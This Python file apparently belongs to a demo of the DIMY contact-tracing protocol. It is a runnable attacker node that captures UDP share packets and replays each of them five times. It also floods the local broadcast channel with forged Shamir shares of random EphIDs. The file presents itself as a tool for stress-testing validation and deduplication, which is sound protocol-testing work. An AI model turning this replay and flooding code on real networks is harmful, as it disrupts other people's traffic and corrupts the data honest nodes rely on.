"""Adversarial traffic generator for the DIMY protocol demo.

The replay mode passively captures UDP share packets and rebroadcasts them.
The flood mode actively broadcasts forged Shamir shares to stress-test client
validation and deduplication behavior.
"""

import hashlib
import json
import secrets
import socket
import sys
import threading
import time

from pyshamir import split

DEFAULT_UDP_PORT = 50000
DEFAULT_THRESHOLD = 3
DEFAULT_SHARE_COUNT = 5
REPLAY_COUNT = 5
REPLAY_DELAY_SECONDS = 0.1
FLOOD_INTERVAL_SECONDS = 0.1


def configure_stdio():
    """Keep console output readable on terminals with different encodings."""
    for stream_name in ("stdout", "stderr"):
        stream = getattr(sys, stream_name, None)
        if stream and hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")


class AttackerNode:
    """Runs replay and flood attacks against the local UDP broadcast channel."""

    def __init__(
        self,
        udp_port=DEFAULT_UDP_PORT,
        threshold=DEFAULT_THRESHOLD,
        share_count=DEFAULT_SHARE_COUNT,
    ):
        self.udp_port = udp_port
        self.threshold = threshold
        self.share_count = share_count
        self.sniffed_messages = set()
        self.attacker_id = f"attacker-{secrets.token_hex(4)}"
        self.is_running = True
        self.replay_thread = None
        self.flood_thread = None

    def replay_attack(self):
        """Capture unique UDP packets and rebroadcast each one several times."""
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.bind(("", self.udp_port))
        listen_sock.settimeout(1.0)

        send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        print("[Attacker] Replay mode started.")

        try:
            while self.is_running:
                try:
                    data, addr = listen_sock.recvfrom(4096)
                except socket.timeout:
                    continue

                if data in self.sniffed_messages:
                    continue

                self.sniffed_messages.add(data)
                try:
                    payload = json.loads(data.decode("utf-8"))
                    print(
                        f"[{time.strftime('%H:%M:%S')}] "
                        "[Attacker] Replaying captured share: "
                        f"from {payload.get('sender_id', 'unknown')[:8]} "
                        f"hash={payload.get('ephid_hash', '')[:12]} via {addr}"
                    )
                except (ValueError, UnicodeDecodeError):
                    print(f"[Attacker] Captured invalid payload from {addr}.")

                print(f"[Attacker] Replaying the captured share {REPLAY_COUNT} times.")
                for _ in range(REPLAY_COUNT):
                    if not self.is_running:
                        break
                    send_sock.sendto(data, ("<broadcast>", self.udp_port))
                    time.sleep(REPLAY_DELAY_SECONDS)
        finally:
            listen_sock.close()
            send_sock.close()

    def flood_attack(self):
        """Broadcast forged EphID shares at a fixed interval."""
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        print("[Attacker] Flood mode started.")
        attack_count = 0

        try:
            while self.is_running:
                fake_ephid = secrets.token_bytes(32)
                ephid_hash = hashlib.sha256(fake_ephid).hexdigest()
                raw_shares = split(fake_ephid, self.share_count, self.threshold)

                for share in raw_shares:
                    payload = {
                        "sender_id": self.attacker_id,
                        "ephid_hash": ephid_hash,
                        "share": share.hex(),
                    }
                    packet = json.dumps(payload, separators=(",", ":")).encode("utf-8")
                    send_sock.sendto(packet, ("<broadcast>", self.udp_port))

                attack_count += 1
                print(
                    f"[{time.strftime('%H:%M:%S')}] "
                    "[Attacker] Flooded forged EphID "
                    f"{attack_count} with hash={ephid_hash[:12]}... "
                    f"({attack_count * self.share_count} forged shares total)."
                )
                time.sleep(FLOOD_INTERVAL_SECONDS)
        finally:
            send_sock.close()

    def start_replay_attack(self):
        """Start replay mode if it is not already active."""
        if self.replay_thread and self.replay_thread.is_alive():
            print("[Attacker] Replay mode is already running.")
            return

        self.replay_thread = threading.Thread(target=self.replay_attack, daemon=True)
        self.replay_thread.start()

    def start_flood_attack(self):
        """Start flood mode if it is not already active."""
        if self.flood_thread and self.flood_thread.is_alive():
            print("[Attacker] Flood mode is already running.")
            return

        self.flood_thread = threading.Thread(target=self.flood_attack, daemon=True)
        self.flood_thread.start()

    def stop(self):
        """Signal all attack threads to stop."""
        self.is_running = False


def run_cli(attacker):
    """Read interactive commands for enabling attack modes."""
    try:
        while attacker.is_running:
            try:
                command = (
                    input(
                        "\n[Replay mode is running | enter 'f' to start flood mode]\n"
                    )
                    .strip()
                    .lower()
                )
            except EOFError:
                while attacker.is_running:
                    time.sleep(1)
                break

            if command == "f":
                attacker.start_flood_attack()
    except KeyboardInterrupt:
        print("\nShutting down attacker node...")
    finally:
        attacker.stop()


def main(argv=None):
    configure_stdio()
    argv = argv or sys.argv

    threshold = DEFAULT_THRESHOLD
    share_count = DEFAULT_SHARE_COUNT

    if len(argv) > 1:
        threshold = int(argv[1])
    if len(argv) > 2:
        share_count = int(argv[2])

    attacker = AttackerNode(threshold=threshold, share_count=share_count)
    attacker.start_replay_attack()
    run_cli(attacker)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
